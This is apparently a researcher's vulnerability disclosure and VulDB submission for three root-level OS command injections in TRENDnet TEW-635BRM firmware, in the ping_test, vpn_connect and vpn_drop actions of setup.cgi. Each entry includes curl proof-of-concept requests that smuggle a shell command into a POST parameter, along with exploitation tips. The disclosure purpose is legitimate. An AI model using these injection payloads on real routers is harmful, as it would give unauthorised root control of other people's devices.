# [CVE-TBD] TRENDnet TEW-635BRM 1.00.1C OS Command Injection (CWE-78)

## VulDB Submission Fields

- Vendor: TRENDnet
- Product: TEW-635BRM
- Version or Commit: 1.00.1C
- Vulnerability: OS Command Injection (CWE-78)
- Advisory / Exploit URL: replace this with the URL of this directory after copying it to your public repository
- Description:

```
An OS command injection vulnerability was discovered in TRENDnet TEW-635BRM (hardware v1.0R) firmware V1.0(1.00.1C). The ping_test action of /usr/sbin/setup.cgi passes the POST parameter c4_IPAddr without sanitization into a ping command line executed via popen() in the root web-process context. The same root cause was previously disclosed for the sibling product TEW-657BRM as CVE-2026-5353; this submission documents the distinct affected product TEW-635BRM and a product-specific exploitation constraint: the CGI environment has a minimal PATH, so injected commands must use absolute paths (e.g. /bin/echo). Reproduction: curl -u admin:password -X POST http://<router>/setup.cgi --data-urlencode todo=ping_test --data-urlencode this_file=diag.htm --data-urlencode next_file=diagping.htm --data-urlencode "c4_IPAddr=127.0.0.1|/bin/echo MARKER >/tmp/f4a" returns HTTP 200 and the marker file is created on the device; a control request with a plain IP only produces the normal ping output page. An authenticated attacker executes arbitrary commands as root; factory credentials or chaining with the pre-authentication issues disclosed for this product remove the authentication barrier. Proposed CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8). Confirmed on TEW-635BRM An OS command injection vulnerability was discovered in TRENDnet TEW-635BRM (hardware v1.0R) firmware V1.0(1.00.1C). The vpn_connect action of /usr/sbin/setup.cgi passes the POST parameter policy_name without sanitization into COMMAND("/usr/local/lib/ipsec/whack --name %s --initiate", policy_name), which is relayed through the /tmp/cmd_agent FIFO to the root daemon cmd_agent_ap and executed with system() as root. The same root cause was previously disclosed for the sibling product TEW-657BRM as CVE-2026-5354; this submission documents the distinct affected product TEW-635BRM and its product-specific execution chain (FIFO relay to a root daemon with a normal PATH). Reproduction: curl -u admin:password -X POST http://<router>/setup.cgi --data-urlencode todo=vpn_connect --data-urlencode next_file=index.htm --data-urlencode "policy_name=x;/bin/echo MARKER >/tmp/f4b;" returns HTTP 200 and the marker file is created on the device by root; control requests with a plain policy name create no files. An authenticated attacker executes arbitrary commands as root; factory credentials or chaining with the pre-authentication issues disclosed for this product remove the authentication barrier. Proposed CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8). Confirmed on TEW-635BRM An OS command injection vulnerability was discovered in TRENDnet TEW-635BRM (hardware v1.0R) firmware V1.0(1.00.1C). The vpn_drop action of /usr/sbin/setup.cgi passes the POST parameter policy_name without sanitization into COMMAND("/usr/local/lib/ipsec/whack --name %s --terminate", policy_name), which is relayed through the /tmp/cmd_agent FIFO to the root daemon cmd_agent_ap and executed with system() as root. The same root cause was previously disclosed for the sibling product TEW-657BRM as CVE-2026-5355; this submission documents the distinct affected product TEW-635BRM and its product-specific execution chain. Reproduction: curl -u admin:password -X POST http://<router>/setup.cgi --data-urlencode todo=vpn_drop --data-urlencode next_file=index.htm --data-urlencode "policy_name=x;/bin/echo MARKER >/tmp/f4c;" returns HTTP 200 and the marker file is created on the device by root; control requests with a plain policy name create no files. An authenticated attacker executes arbitrary commands as root; factory credentials or chaining with the pre-authentication issues disclosed for this product remove the authentication barrier. Proposed CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8). Confirmed on TEW-635BRM
```

---

## Technical Disclosure

# Confirmed on TEW-635BRM: setup.cgi `ping_test` — `c4_IPAddr` OS Command Injection

> Original discovery (TEW-657BRM): **CVE-2026-5353** (published
> 2026-04-02) — "Affected is the function ping_test of the file
> /setup.cgi. Performing a manipulation of the argument c4_IPAddr results
> in os command injection." This document confirms the same root cause on
> TEW-635BRM v1.0R firmware V1.0(1.00.1C) and notes a product-specific
> exploitation constraint.

## Affected Product

- Vendor: TRENDnet / Product: TEW-635BRM (v1.0R) / Firmware: V1.0(1.00.1C) (latest for v1.0R)
- Component: `/usr/sbin/setup.cgi` action `ping_test`

## Root Cause

```c
// ping_test action (setup.cgi): c4_IPAddr reaches a popen("...ping...")-style
// command line without sanitization.
```

Product-specific note (TEW-635BRM): the CGI process environment has a
**minimal PATH**; injected commands must use absolute paths
(`/bin/echo`, `/bin/ps`, …). Commands run in the web-process context
(root). (`vpn_connect`/`vpn_drop` injections — separate entries — go
through the `cmd_agent_ap` daemon instead and have a normal PATH.)

## Proof of Concept (non-destructive)

```bash
curl -s -u admin:password -X POST http://<ROUTER_IP>/setup.cgi \
 --data-urlencode "todo=ping_test" \
 --data-urlencode "this_file=diag.htm" \
 --data-urlencode "next_file=diagping.htm" \
 --data-urlencode "c4_IPAddr=127.0.0.1|/bin/echo MARKER >/tmp/f4a"
```

Observed on the rehosted firmware: HTTP 200, and inside the device
`/tmp/f4a` contains the marker. A control request with
`c4_IPAddr=127.0.0.1` produces the normal ping output page only.

## Impact

Authenticated OS command injection in the root web-process context;
effectively unauthenticated when factory credentials are in place or when
combined with the pre-authentication issues in this package.

## Proposed CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**

## Verification

- Date: 2026-10-12 — confirmed on TEW-635BRM V1.0(1.00.1C) (rehosted firmware)

# Confirmed on TEW-635BRM: setup.cgi `vpn_connect` — `policy_name` OS Command Injection

> Original discovery (TEW-657BRM): **CVE-2026-5354** (published
> 2026-04-02) — "Affected by this vulnerability is the function
> vpn_connect of the file /setup.cgi. Executing a manipulation of the
> argument policy_name can lead to os command injection." This document
> confirms the same root cause on TEW-635BRM v1.0R firmware V1.0(1.00.1C).

## Affected Product

- Vendor: TRENDnet / Product: TEW-635BRM (v1.0R) / Firmware: V1.0(1.00.1C) (latest for v1.0R)
- Component: `/usr/sbin/setup.cgi` action `vpn_connect` → `/tmp/cmd_agent` FIFO → `/usr/sbin/cmd_agent_ap` (root daemon)

## Root Cause

```c
// vpn_connect action (setup.cgi):
policy = find_val(req, "policy_name"); // no sanitization
COMMAND("/usr/local/lib/ipsec/whack --name %s --initiate", policy);
// COMMAND() → /tmp/cmd_agent FIFO → cmd_agent_ap executes with system() as root
```

On TEW-635BRM the injected command is executed by the `cmd_agent_ap`
root daemon (normal PATH), not by the CGI process itself.

## Proof of Concept (non-destructive)

```bash
curl -s -u admin:password -X POST http://<ROUTER_IP>/setup.cgi \
 --data-urlencode "todo=vpn_connect" \
 --data-urlencode "next_file=index.htm" \
 --data-urlencode "policy_name=x;/bin/echo MARKER >/tmp/f4b;"
```

Observed on the rehosted firmware: HTTP 200, and inside the device
`/tmp/f4b` contains the marker (created by root). Control requests with a
plain policy name create no files.

## Impact

Authenticated root command execution; effectively unauthenticated with
factory credentials or chained with the pre-authentication issues in this
package.

## Proposed CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**

## Verification

- Date: 2026-10-12 — confirmed on TEW-635BRM V1.0(1.00.1C) (rehosted firmware)

# Confirmed on TEW-635BRM: setup.cgi `vpn_drop` — `policy_name` OS Command Injection

> Original discovery (TEW-657BRM): **CVE-2026-5355** (published
> 2026-04-02) — "Affected by this issue is the function vpn_drop of the
> file /setup.cgi. The manipulation of the argument policy_name leads to
> os command injection." This document confirms the same root cause on
> TEW-635BRM v1.0R firmware V1.0(1.00.1C).

## Affected Product

- Vendor: TRENDnet / Product: TEW-635BRM (v1.0R) / Firmware: V1.0(1.00.1C) (latest for v1.0R)
- Component: `/usr/sbin/setup.cgi` action `vpn_drop` → `/tmp/cmd_agent` FIFO → `/usr/sbin/cmd_agent_ap` (root daemon)

## Root Cause

```c
// vpn_drop action (setup.cgi):
policy = find_val(req, "policy_name"); // no sanitization
COMMAND("/usr/local/lib/ipsec/whack --name %s --terminate", policy);
// COMMAND() → /tmp/cmd_agent FIFO → cmd_agent_ap executes with system() as root
```

## Proof of Concept (non-destructive)

```bash
curl -s -u admin:password -X POST http://<ROUTER_IP>/setup.cgi \
 --data-urlencode "todo=vpn_drop" \
 --data-urlencode "next_file=index.htm" \
 --data-urlencode "policy_name=x;/bin/echo MARKER >/tmp/f4c;"
```

Observed on the rehosted firmware: HTTP 200, and inside the device
`/tmp/f4c` contains the marker (created by root). Control requests with a
plain policy name create no files.

## Impact

Authenticated root command execution; effectively unauthenticated with
factory credentials or chained with the pre-authentication issues in this
package.

## Proposed CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**

## Verification

- Date: 2026-10-12 — confirmed on TEW-635BRM V1.0(1.00.1C) (rehosted firmware)

## Proof of Concept

See the poc file(s) in this directory.
